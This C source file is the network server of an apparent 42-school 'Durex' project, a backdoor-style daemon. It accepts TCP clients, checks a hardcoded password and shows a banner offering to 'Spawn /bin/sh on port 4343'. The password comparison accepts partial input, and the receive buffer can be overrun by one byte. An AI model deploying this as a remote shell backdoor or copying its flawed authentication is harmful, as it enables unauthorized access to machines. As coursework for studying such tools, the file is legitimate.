/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:44:24 by banthony          #+#    #+#             */
/*   Updated: 2019/11/18 12:08:06 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"
#include "durex_log.h"

/*
**	Build client prefix string: 'Client[x.x.x.x]:'
*/
t_bool	client_prefix(void *data, char (*prefix)[PREFIX_SIZE])
{
	t_client *client;

	if (!(client = (t_client*)data) || !prefix)
		return (false);
	if (7 + 2 +  ft_strlen(client->addr) >= PREFIX_SIZE)
		return (false);
	ft_strncpy(&(*prefix)[0], "Client[", 7);
	ft_strncat(&(*prefix)[0], client->addr, ft_strlen(client->addr));
	ft_strncat(&(*prefix)[0], "]:", 2);
	return (true);
}

void		send_text(char *text, int socket)
{
	if (socket > 0 && text)
		send(socket, text, ft_strlen(text), 0);
}

static void		welcome_client(t_client *clt)
{
	char *durex_header;
	char *shell_header;

	durex_header =	"/* ************************************************************************** */\n"
					"/*                                                        :::      ::::::::   */\n"
					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
										"                           :+:      :+:    :+:   */\n"
					"/*                                                    +:+ +:+         +:+     */\n"
					"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
					"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
					"/*                                                     #+#    #+#             */\n"
					"/*                                                    ###   ########          */\n"
					"/* ************************************************************************** */\n"
					"\nDurex>";
	shell_header =	"/* ************************************************************************** */\n"
					"/*                                                        :::      ::::::::   */\n"
					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
												"                           :+:      :+:    :+:   */\n"
					"/*                                                    +:+ +:+         +:+     */\n"
					"/*      * Spawn /bin/sh on port 4343                +#+  +:+       +#+        */\n"
					"/*                                                +#+#+#+#+#+   +#+           */\n"
					"/*                                                     #+#    #+#             */\n"
					"/*                                                    ###   ########          */\n"
					"/* ************************************************************************** */\n";

	if (!clt->granted)
	{
		send_text(durex_header, clt->socket);
		clt->granted = true;
	}
	else
		send_text(shell_header, clt->socket);
	durex_log_with(CLIENT_LOG, LOG_INFO, client_prefix, clt);
}

static t_bool	add_client(t_server *server, int cs, struct sockaddr_in csin)
{
	t_list		*nc;
	t_client	new_client;

	new_client.socket = cs;
	new_client.addr = inet_ntoa(csin.sin_addr);
	new_client.granted = !server->require_pass;
	if (!(nc = ft_lstnew(&new_client, sizeof(new_client))))
	{
		durex_log(ALLOC_ERR("Connexion aborted."), LOG_WARNING);
		send_text(ALLOC_ERR("Connexion aborted."), cs);
		FD_CLR(cs, &server->fdset);
		close(cs);
		return (false);
	}

	if (server->client_lst == NULL)
		server->client_lst = nc;
	else
		ft_lstadd(&server->client_lst, nc);

	if (!new_client.granted)
		send_text(PASS_REQUEST, cs);
	else
		welcome_client(&new_client);
	FD_SET(cs, &server->fdset);
	server->clients++;
	durex_log_with(CLIENT_LOGIN, LOG_INFO, client_prefix, &new_client);
	return (true);
}

t_bool	new_client(t_server *server)
{
	int					cs;
	unsigned int		cs_len;
	struct sockaddr_in	csin;

	if ((cs = accept(server->socket, (struct sockaddr*)&csin, &cs_len)) < 0)
	{
		durex_log(ACCEPT_ERR, LOG_ERROR);
		durex_log(strerror(errno), LOG_ERROR);
		return (false);
	}
	if (server->clients >= server->client_limit)
	{
		durex_log(CONNEXION_REFUSED, LOG_INFO);
		send_text(CONNEXION_REFUSED, cs);
		FD_CLR(cs, &server->fdset);
		close(cs);
		return (false);
	}
	return (add_client(server, cs, csin));
}

static void		del_client(void *data, size_t size)
{
	if (!data)
		return ;
	(void)size;
}

t_bool	deco_client(t_client *client, t_server *server)
{
	t_list		*elmt;
	t_list		*prev;
	t_client	*stored_client;

	prev = NULL;
	elmt = server->client_lst;
	if (!client || !server || !elmt)
		return (false);
	while (elmt)
	{
		stored_client = (t_client*)elmt->content;
		if (stored_client->socket == client->socket)
		{
			FD_CLR(client->socket, &server->fdset);
			close(client->socket);
			durex_log_with(DISCONNECTED, LOG_INFO, client_prefix, client);
			server->clients--;
			// If we are not on the first elmt, relink the list
			if (prev)
				prev->next = elmt->next;
			// Update the first elmt if it's the first elmt
			else
				server->client_lst = elmt->next;
			// Finally delete this elmt
			ft_lstdelone(&elmt, del_client);
			break ;
		}
		prev = elmt;
		elmt = elmt->next;
	}
	return (true);
}

t_bool	create_server(t_server *server, int port, size_t client_limit)
{
	int					sock;
	struct sockaddr_in	sin;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	if ((bind(sock, (const struct sockaddr*)&sin, sizeof(sin))) < 0)
	{
		durex_log(BIND_ERR, LOG_ERROR);
		return (false);
	}
	listen(sock, MAX_PENDING_CLIENT);
	server->client_limit = client_limit;
	server->port = port;
	server->socket = sock;
	return (true);
}

static t_bool	client_handler(t_server *server, int fd)
{
	t_list		*elmt;
	t_client	*client;
	char		buf[READ_BUFFER_SIZE];
	ssize_t		ret;

	elmt = server->client_lst;
	while (elmt)
	{
		client = (t_client*)elmt->content;
		if (fd == client->socket)
		{
			// use rcv instead
			if ((ret = recv(fd, buf, READ_BUFFER_SIZE, 0)) <= 0)
				return (deco_client(client, server));
			if (client->granted == false)
			{
				(!ft_strncmp(buf, PASSWORD, (size_t)ret)) ? welcome_client(client)
					: send_text(PASS_REQUEST, fd);
				elmt->content = client;
				break ;
			}
			buf[ret] = '\0';
			server_command_handler(buf, ret, server, client);
			break ;
		}
		elmt = elmt->next;
	}
	return (true);
}

t_bool	server_loop(t_server *server)
{
	int		i;
	fd_set	readfdset;

	FD_ZERO(&readfdset);
	FD_ZERO(&server->fdset);
	FD_SET(server->socket, &server->fdset);
	durex_log(SERVER_STARTED, LOG_INFO);
	while (42)
	{
		readfdset = server->fdset;
		if (select(FD_SETSIZE, &readfdset, NULL, NULL, NULL) < 0)
		{
			durex_log(SELECT_ERR, LOG_ERROR);
			durex_log(strerror(errno), LOG_ERROR);
			return (false);
		}
		i = -1;
		while (++i < FD_SETSIZE)
		{
			// Does this descriptor is ready for read ?
			if (FD_ISSET(i, &readfdset) == 0)
				continue;
				// If it correspond to the server descriptor, handle a new connexion
			if (FD_ISSET(server->socket, &readfdset))
				new_client(server);
			// Otherwise, handle client data
			else
				client_handler(server, i);
		}
	}
}
